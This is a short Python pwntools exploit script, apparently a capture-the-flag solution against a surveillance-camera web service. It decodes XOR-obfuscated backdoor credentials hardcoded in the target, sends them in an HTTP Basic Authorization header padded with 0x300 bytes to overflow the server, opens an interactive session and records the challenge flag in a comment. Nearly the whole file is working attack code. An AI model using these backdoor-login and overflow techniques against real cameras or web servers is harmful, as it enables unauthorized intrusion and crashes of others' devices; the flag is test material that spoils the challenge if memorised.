#!/usr/bin/env python

from pwn import *
import requests

def get_backdoor_creds():
	a = [0x4F937913, 0x50C20A33, 0x69910E35, 0x22F23A77]
	k = 0x22F23A77

	usr = []
	for i in a:
		usr.append( p32( i ^ k ) )

	print ''.join(usr[::-1]).strip('\x00')

	ct = [0x1D, 0x61, 0x36, 0x3E, 0x66, 0x27, 0x14, 0x62, 0x62, 0x61, 0x36, 0x3E]
	k = 0x55

	pt = ''

	for i in ct:
		pt += chr( i ^ k )

	print pt

#user=B4cKD00rdCam:pwd=H4ck3rA774ck

r = remote('surveillance.pwn.democrat', 80)
#payload = '''get /index.htm HTTP/1.1\x0d\x0aAuthorization: Basic QjRjS0QwMHJkQ2FtOkg0Y2szckE3NzRjaw==\x0d\x0a\x0d\x0a'''
payload = '''Authorization: Basic QjRjS0QwMHJkQ2FtOkg0Y2szckE3NzRjaw==\x0d\x0a''' + "A" * 0x300 + '''\x0d\x0a\x0d\x0a'''

r.send(payload)
r.interactive()


#req = 
#resp = requests.get("http://surveillance.pwn.democrat/snapshot.cgi", data={'user':'B4cKD00rdCam', 'pwd':'H4ck3rA774ck'})

#flag{B4CK_D0OR_A1L_7h3_107!4_R3AL!}
#print resp.headers
#print resp.text



